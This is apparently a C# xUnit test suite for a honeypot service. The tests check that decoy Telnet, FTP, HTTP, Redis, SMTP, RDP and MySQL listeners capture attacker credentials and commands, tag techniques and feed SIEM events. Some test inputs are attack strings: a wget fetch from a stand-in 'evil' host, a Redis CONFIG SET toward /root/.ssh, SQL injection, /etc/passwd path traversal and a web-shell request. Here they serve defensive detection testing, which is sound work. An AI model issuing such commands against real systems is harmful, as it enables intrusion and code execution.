using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using FluentAssertions;
using PROSCANNERCONT.Models;
using PROSCANNERCONT.Services.Honeypot;
using Xunit;

namespace PROSCANNERCONT.Tests;

/// <summary>
/// Verifies the honeypot actually captures attacker interaction (the whole point the old
/// Hyper-V dashboard was missing) and maps hits into SIEM events.
/// </summary>
public class HoneypotCaptureTests
{
    private static int FreePort()
    {
        var l = new TcpListener(IPAddress.Loopback, 0);
        l.Start();
        int p = ((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    private static HoneypotHit? DriveAndCapture(HoneypotServiceKind kind, string clientPayload)
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(kind, port).Should().BeTrue("the decoy listener should bind");

        HoneypotHit? captured = null;
        using var got = new ManualResetEventSlim();
        svc.HitRecorded += h => { captured = h; got.Set(); };

        try
        {
            using var client = new TcpClient();
            client.Connect(IPAddress.Loopback, port);
            var bytes = Encoding.ASCII.GetBytes(clientPayload);
            client.GetStream().Write(bytes, 0, bytes.Length);
            client.GetStream().Flush();
            got.Wait(5000).Should().BeTrue("the decoy should record the interaction");
        }
        finally { svc.StopAll(); }

        return captured;
    }

    private static List<HoneypotHit> DriveAndCaptureAll(HoneypotServiceKind kind, string clientPayload, int waitMs = 2500)
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(kind, port).Should().BeTrue();

        var hits = new List<HoneypotHit>();
        svc.HitRecorded += h => { lock (hits) hits.Add(h); };
        try
        {
            using var client = new TcpClient();
            client.Connect(IPAddress.Loopback, port);
            var bytes = Encoding.ASCII.GetBytes(clientPayload);
            client.GetStream().Write(bytes, 0, bytes.Length);
            client.GetStream().Flush();
            Thread.Sleep(waitMs);
        }
        finally { svc.StopAll(); }
        lock (hits) return hits.ToList();
    }

    private static string SendAndRead(int port, string payload, int waitMs = 700)
    {
        using var client = new TcpClient();
        client.Connect(IPAddress.Loopback, port);
        var ns = client.GetStream();
        if (payload.Length > 0) { var b = Encoding.ASCII.GetBytes(payload); ns.Write(b, 0, b.Length); ns.Flush(); }
        Thread.Sleep(waitMs);
        var buf = new byte[8192]; int n = 0;
        try { ns.ReadTimeout = 1500; n = ns.Read(buf, 0, buf.Length); } catch { }
        return Encoding.UTF8.GetString(buf, 0, Math.Max(0, n));
    }

    [Fact]
    public void Http_Decoy_Serves_Custom_Website()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Http, port, new DecoyOptions { HttpHtml = "<h1>ACME Bank Login</h1>" }).Should().BeTrue();
        try
        {
            var resp = SendAndRead(port, "GET / HTTP/1.1\r\nHost: x\r\n\r\n");
            resp.Should().Contain("200 OK");
            resp.Should().Contain("ACME Bank Login");
        }
        finally { svc.StopAll(); }
    }

    [Fact]
    public void Telnet_Decoy_Uses_Custom_Banner()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Telnet, port, new DecoyOptions { Banner = "MikroTik RouterOS 6.49" }).Should().BeTrue();
        try { SendAndRead(port, "").Should().Contain("MikroTik RouterOS 6.49"); }
        finally { svc.StopAll(); }
    }

    [Fact]
    public void Listener_Reports_Reachable_Endpoints()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Raw, port).Should().BeTrue();
        try
        {
            var ep = svc.Listeners[0].Endpoints;
            ep.Should().Contain($":{port}");
            ep.Should().Contain("127.0.0.1");
        }
        finally { svc.StopAll(); }
    }

    [Fact]
    public void Telnet_Decoy_Captures_Credentials()
    {
        var hit = DriveAndCapture(HoneypotServiceKind.Telnet, "admin\r\nSup3rSecret!\r\n");
        hit.Should().NotBeNull();
        hit!.Service.Should().Be(HoneypotServiceKind.Telnet);
        hit.Username.Should().Be("admin");
        hit.Password.Should().Be("Sup3rSecret!");
        hit.HasCredentials.Should().BeTrue();
        hit.Severity.Should().Be("High");
    }

    [Fact]
    public void Ftp_Decoy_Captures_User_And_Pass()
    {
        var hit = DriveAndCapture(HoneypotServiceKind.Ftp, "USER root\r\nPASS toor\r\n");
        hit.Should().NotBeNull();
        hit!.Username.Should().Be("root");
        hit.Password.Should().Be("toor");
    }

    [Fact]
    public void Http_Decoy_Captures_Request_Line()
    {
        var hit = DriveAndCapture(HoneypotServiceKind.Http, "GET /admin HTTP/1.1\r\nUser-Agent: sqlmap\r\n\r\n");
        hit.Should().NotBeNull();
        hit!.Service.Should().Be(HoneypotServiceKind.Http);
        hit.Summary.Should().Contain("GET /admin");
        (hit.Data ?? "").Should().Contain("sqlmap");
    }

    [Fact]
    public void Http_Decoy_Captures_BasicAuth_Credentials()
    {
        // "admin:secret" -> base64 YWRtaW46c2VjcmV0
        var hit = DriveAndCapture(HoneypotServiceKind.Http,
            "GET /admin HTTP/1.1\r\nHost: t\r\nAuthorization: Basic YWRtaW46c2VjcmV0\r\n\r\n");
        hit.Should().NotBeNull();
        hit!.Username.Should().Be("admin");
        hit.Password.Should().Be("secret");
        hit.Severity.Should().Be("High");
    }

    [Fact]
    public void Http_Decoy_Captures_Form_Login()
    {
        var hit = DriveAndCapture(HoneypotServiceKind.Http,
            "POST /login HTTP/1.1\r\nHost: t\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=root&password=toor");
        hit.Should().NotBeNull();
        hit!.Username.Should().Be("root");
        hit.Password.Should().Be("toor");
    }

    [Fact]
    public void SiemBridge_Promotes_Attacker_Ip_To_Indicator()
    {
        var ind = HoneypotSiemBridge.ToIndicator(new HoneypotHit
        {
            Service = HoneypotServiceKind.Telnet, SourceIp = "9.9.9.9", Username = "root", Password = "toor",
        });
        ind.Value.Should().Be("9.9.9.9");
        ind.Type.Should().Be("ip");
        ind.Source.Should().Be("honeypot");
        ind.Note.Should().Contain("credentials");
    }

    [Fact]
    public void Records_Source_And_TopAttackers()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Raw, port).Should().BeTrue();
        using var got = new ManualResetEventSlim();
        svc.HitRecorded += _ => got.Set();

        using (var c = new TcpClient())
        {
            c.Connect(IPAddress.Loopback, port);
            var b = Encoding.ASCII.GetBytes("hello decoy");
            c.GetStream().Write(b, 0, b.Length);
            got.Wait(5000).Should().BeTrue();
        }
        svc.StopAll();

        svc.TotalHits.Should().Be(1);
        var top = svc.TopAttackers();
        top.Should().ContainSingle();
        top[0].ip.Should().Be("127.0.0.1");
    }

    [Fact]
    public void InjectRemote_Records_Hit_Without_A_Listener()
    {
        // Console side: hits streamed from a remote sensor are recorded for display.
        var svc = new HoneypotCaptureService();
        svc.InjectRemote(new HoneypotHit
        {
            Service = HoneypotServiceKind.Telnet, SourceIp = "1.2.3.4", Username = "a", Password = "b",
        });
        svc.TotalHits.Should().Be(1);
        svc.CredentialHits.Should().Be(1);
        svc.RecentHits()[0].SourceIp.Should().Be("1.2.3.4");
    }

    [Fact]
    public void Telnet_FakeShell_Captures_Commands()
    {
        var hits = DriveAndCaptureAll(HoneypotServiceKind.Telnet,
            "hacker\r\nletmein\r\nwhoami\r\nwget http://evil/x.sh\r\nexit\r\n");
        hits.Should().Contain(h => h.Username == "hacker" && h.Password == "letmein");   // login captured
        hits.Should().Contain(h => (h.Data ?? "").Contains("whoami"));                    // command captured
        var download = hits.FirstOrDefault(h => (h.Data ?? "").Contains("wget"));
        download.Should().NotBeNull();
        download!.Tags.Should().Contain("RCE");        // wget flagged as remote code exec
        download.Severity.Should().Be("Critical");
    }

    [Fact]
    public void Classifier_Tags_Techniques_And_Escalates_Severity()
    {
        var sqli = new HoneypotHit { Severity = "Low", Data = "GET /?id=1' OR 1=1-- HTTP/1.1  User-Agent: sqlmap/1.7" };
        HoneypotClassifier.Apply(sqli);
        sqli.Tags.Should().Contain("SQLi");
        sqli.Tags.Should().Contain("Scanner");
        sqli.Severity.Should().Be("High");

        var trav = new HoneypotHit { Severity = "Medium", Summary = "http GET /../../etc/passwd" };
        HoneypotClassifier.Apply(trav);
        trav.Tags.Should().Contain("PathTraversal");

        var dc = new HoneypotHit { Severity = "Medium", Username = "root", Password = "root" };
        HoneypotClassifier.Apply(dc);
        dc.Tags.Should().Contain("DefaultCreds");
    }

    [Fact]
    public void Tracks_Top_Usernames_And_Passwords()
    {
        var svc = new HoneypotCaptureService();
        svc.InjectRemote(new HoneypotHit { Username = "admin", Password = "admin" });
        svc.InjectRemote(new HoneypotHit { Username = "admin", Password = "123456" });
        svc.InjectRemote(new HoneypotHit { Username = "root", Password = "admin" });

        var topUser = svc.TopUsernames();
        topUser[0].user.Should().Be("admin");
        topUser[0].count.Should().Be(2);
        svc.TopPasswords()[0].pass.Should().Be("admin");
    }

    [Fact]
    public void Redis_Decoy_Captures_Commands_And_Rce()
    {
        var hits = DriveAndCaptureAll(HoneypotServiceKind.Redis,
            "CONFIG SET dir /root/.ssh\r\nAUTH secretpass\r\nQUIT\r\n");
        var rce = hits.FirstOrDefault(h => (h.Data ?? "").Contains("CONFIG SET"));
        rce.Should().NotBeNull();
        rce!.Tags.Should().Contain("RCE");                       // Redis CONFIG SET flagged
        hits.Should().Contain(h => h.Password == "secretpass");  // AUTH captured
    }

    [Fact]
    public void Smtp_Decoy_Captures_Auth_Login()
    {
        // aGFja2Vy = "hacker", bGV0bWVpbg== = "letmein"
        var hits = DriveAndCaptureAll(HoneypotServiceKind.Smtp,
            "EHLO x\r\nAUTH LOGIN\r\naGFja2Vy\r\nbGV0bWVpbg==\r\nQUIT\r\n");
        hits.Should().Contain(h => h.Username == "hacker" && h.Password == "letmein");
    }

    [Fact]
    public void Rdp_Decoy_Captures_Mstshash_Username()
    {
        var hit = DriveAndCapture(HoneypotServiceKind.Rdp, "x Cookie: mstshash=administrator\r\n");
        hit.Should().NotBeNull();
        hit!.Username.Should().Be("administrator");
    }

    [Fact]
    public void Mysql_Decoy_Captures_Login_Username()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Mysql, port).Should().BeTrue();

        HoneypotHit? hit = null;
        using var got = new ManualResetEventSlim();
        svc.HitRecorded += h => { hit = h; got.Set(); };
        try
        {
            using var client = new TcpClient();
            client.Connect(IPAddress.Loopback, port);
            var ns = client.GetStream();
            var greet = new byte[512]; ns.ReadTimeout = 1500; try { ns.Read(greet, 0, greet.Length); } catch { }

            // client login packet: 4-byte header + 32 fixed bytes + "hacker\0" (username at payload offset 32)
            var uname = Encoding.ASCII.GetBytes("hacker");
            var pkt = new byte[4 + 32 + uname.Length + 1];
            int bodyLen = pkt.Length - 4;
            pkt[0] = (byte)(bodyLen & 0xff); pkt[3] = 1;
            Array.Copy(uname, 0, pkt, 4 + 32, uname.Length);
            ns.Write(pkt, 0, pkt.Length); ns.Flush();
            got.Wait(3000).Should().BeTrue();
        }
        finally { svc.StopAll(); }

        hit.Should().NotBeNull();
        hit!.Username.Should().Be("hacker");
    }

    [Fact]
    public void Start_Twice_On_Same_Port_Fails()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Raw, port).Should().BeTrue();
        svc.Start(HoneypotServiceKind.Telnet, port).Should().BeFalse("the port is already in use");
        svc.StopAll();
    }

    [Fact]
    public void SiemBridge_Maps_Hit_To_Event()
    {
        var hit = new HoneypotHit
        {
            Service = HoneypotServiceKind.Telnet, Port = 23,
            SourceIp = "9.9.9.9", SourcePort = 5555,
            Username = "root", Password = "toor",
            Severity = "High", Summary = "telnet login root/toor",
        };
        var ev = HoneypotSiemBridge.ToEvent(hit);

        ev.Category.Should().Be("Honeypot");
        ev.Severity.Should().Be(SiemSeverity.High);
        ev.Source.Should().Be("Honeypot");
        ev.Fields["source.ip"].Should().Be("9.9.9.9");
        ev.Fields["user.name"].Should().Be("root");
        ev.Fields["honeypot.service"].Should().Be("TELNET");
    }

    // ── #1 unbounded-growth guards ────────────────────────────────────────────
    [Fact]
    public void Stat_Maps_Are_Cardinality_Bounded_And_Retain_Top_Talkers()
    {
        var svc = new HoneypotCaptureService();

        // One persistent heavy hitter.
        for (int i = 0; i < 500; i++)
            svc.InjectRemote(new HoneypotHit { SourceIp = "203.0.113.7" });

        // Flood with unique low-count sources to blow past the 50k cardinality cap.
        for (int i = 0; i < 60_000; i++)
            svc.InjectRemote(new HoneypotHit { SourceIp = $"10.{(i >> 8) & 0xff}.{i & 0xff}.0" });

        // The source map is capped — NOT one permanent entry per distinct attacker IP.
        svc.UniqueSources.Should().BeLessThan(60_000);
        svc.UniqueSources.Should().BeLessThanOrEqualTo(50_000);

        // Eviction drops the long tail (count-1 IPs), never the top talker.
        svc.TopAttackers(1)[0].ip.Should().Be("203.0.113.7");
    }

    [Fact]
    public void Rate_Limiter_Throttles_A_Flooding_Source()
    {
        var svc = new HoneypotCaptureService();
        int port = FreePort();
        svc.Start(HoneypotServiceKind.Raw, port).Should().BeTrue();
        try
        {
            // A single loopback source well over the 40/min cap → later connections are throttled.
            for (int i = 0; i < 80; i++)
            {
                try { using var c = new TcpClient(); c.Connect(IPAddress.Loopback, port); }
                catch { /* refused mid-flood is fine */ }
            }
            Thread.Sleep(800);   // let the accept handlers run the rate check
        }
        finally { svc.StopAll(); }

        svc.TotalThrottled.Should().BeGreaterThan(0,
            "a single source exceeding the per-minute cap must be throttled, not buffered forever");
    }

    // ── #2 IOC-promotion gate ─────────────────────────────────────────────────
    [Fact]
    public void SiemBridge_Promotes_Only_Real_Interactions()
    {
        // Bare TCP connect / port scan: no creds, no tags, no payload → must NOT become an IOC.
        HoneypotSiemBridge.WorthPromoting(new HoneypotHit
        { Service = HoneypotServiceKind.Raw, SourceIp = "198.51.100.9", Summary = "tcp connect" })
            .Should().BeFalse();

        // Credentials → promote.
        HoneypotSiemBridge.WorthPromoting(new HoneypotHit
        { SourceIp = "198.51.100.9", Username = "root", Password = "toor" })
            .Should().BeTrue();

        // A classified technique (tag) → promote.
        var tagged = new HoneypotHit { SourceIp = "198.51.100.9" };
        tagged.Tags.Add("RCE");
        HoneypotSiemBridge.WorthPromoting(tagged).Should().BeTrue();

        // An actual captured payload → promote.
        HoneypotSiemBridge.WorthPromoting(new HoneypotHit
        { SourceIp = "198.51.100.9", Data = "GET /shell.php?cmd=id" })
            .Should().BeTrue();
    }
}
